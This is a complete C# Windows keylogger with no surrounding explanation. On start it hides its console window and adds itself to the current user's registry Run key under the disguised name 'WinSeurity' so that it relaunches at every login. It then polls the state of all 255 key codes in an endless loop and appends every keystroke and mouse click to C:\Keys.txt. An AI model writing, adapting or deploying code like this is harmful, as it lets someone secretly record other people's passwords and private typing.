using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.IO;
using System.Text;

namespace ConsoleApp4
{

   static class NativeMethods
    {
        [DllImport("kernel32.dll")]
        static public extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static public extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public const int SW_HIDE = 0;
    }
    




    class Program
    {


        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);



        static void Main(string[] args)
        {

            var handle = NativeMethods.GetConsoleWindow();
            NativeMethods.ShowWindow(handle, NativeMethods.SW_HIDE);
            var avt = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            avt.SetValue("WinSeurity", Application.ExecutablePath);
            StartLogging();

        }




        static void StartLogging()
        {
            string tex;
            while (true)
            {
                Thread.Sleep(1);
                for (Int32 i = 0; i < 255; i++)
                {
                    tex = ((Keys)i).ToString();
                    int keyState = GetAsyncKeyState(i);
                    if (keyState==1 || keyState==-32767)
                    {
                        switch(tex){

                            case "LButton":
                                tex = "mlk";
                                break;

                            case "RButton":
                                tex = "mrk";
                                break;

                            case "ShiftKey":
                                tex = "shft";
                                break;

                            case "LShiftKey":
                                tex = "shft";
                                break;

                            case "ControlKey":
                                tex = "cntrl";
                                break;

                            case "LControlKey":
                                tex = "cntrl";
                                break;

                            case "Menu":
                                tex = "men";
                                break;

                            case "Back":
                                tex = "bcsp";
                                break;

                            case "Delete":
                                tex = "dlt";
                                break;

                            case "NumPad0":
                                tex = "0";
                                break;

                            case "NumPad1":
                                tex = "1";
                                break;

                            case "NumPad2":
                                tex = "2";
                                break;

                            case "NumPad3":
                                tex = "3";
                                break;

                            case "NumPad4":
                                tex = "4";
                                break;

                            case "NumPad5":
                                tex = "5";
                                break;

                            case "NumPad6":
                                tex = "6";
                                break;

                            case "NumPad7":
                                tex = "7";
                                break;

                            case "NumPad8":
                                tex = "8";
                                break;

                            case "NumPad9":
                                tex = "9";
                                break;

                            case "Decimal":
                                tex = ".";
                                break;
                        }


                        StreamWriter wr = new StreamWriter("C:\\Keys.txt", true, Encoding.ASCII);
                        wr.Write("  ");
                        wr.Write(tex);
                        wr.Close();                        
                    }
                }
            }
        }
    }
}
